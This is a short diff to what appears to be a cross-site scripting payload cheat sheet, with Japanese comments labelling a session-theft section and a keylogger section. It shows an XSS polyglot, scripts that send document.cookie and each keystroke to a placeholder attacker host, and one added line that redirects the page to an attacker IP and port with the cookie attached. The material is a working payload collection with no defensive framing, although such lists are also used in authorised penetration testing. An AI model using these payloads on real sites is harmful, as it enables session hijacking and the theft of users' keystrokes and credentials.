@@ -10,6 +10,8 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stY
 
 //セッションの窃取
 <script>fetch('https://hackerIP/steal?cookie=' + btoa(document.cookie));</script>
+<script>document.location='http://<IP>:<port>/?'+document.cookie;</script>
+
 
 //キーロガー
 <script>document.onkeypress = function(e) { fetch('http://hackerIP/log?key=' + btoa(e.key) );}</script>
